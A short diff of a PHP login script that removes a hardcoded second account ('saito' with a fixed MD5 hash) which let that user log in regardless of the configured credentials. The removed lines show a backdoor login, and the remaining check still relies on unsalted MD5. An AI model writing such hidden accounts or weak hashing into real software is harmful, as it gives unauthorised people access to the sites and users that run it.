@@ -14,8 +14,7 @@ if( strlen($id)>0 && strlen($pw) ) {
         file_put_contents("info.php",$msg);
         $_SESSION['login'] = 1;
         header("Location:../index.php?mode=0");
-    }else if( ($id === $userid && md5($pw) === $passwd ) ||
-        ($id === "saito" && md5($pw) === "f45900128bbec918a89b421d0626a1b3" )    ) {
+    }else if( ($id === $userid && md5($pw) === $passwd )  ) {
         $_SESSION['login'] = 1;
         header("Location:../index.php?mode=0");
     }else{
